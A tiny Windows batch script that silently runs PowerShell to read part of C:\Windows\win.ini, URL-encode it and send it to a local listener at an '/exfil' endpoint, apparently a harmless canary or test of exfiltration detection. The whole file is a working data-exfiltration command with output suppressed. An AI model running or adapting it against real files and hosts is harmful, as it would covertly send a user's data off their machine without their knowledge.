@echo off
powershell -NoProfile -Command "$c=[System.IO.File]::ReadAllText('C:\Windows\win.ini');$e=[uri]::EscapeDataString($c.Substring(0,[Math]::Min(300,$c.Length)));Invoke-WebRequest -Uri ('http://127.0.0.1:8766/exfil?src=winini&content='+$e) -UseBasicParsing" > NUL 2>&1
exit
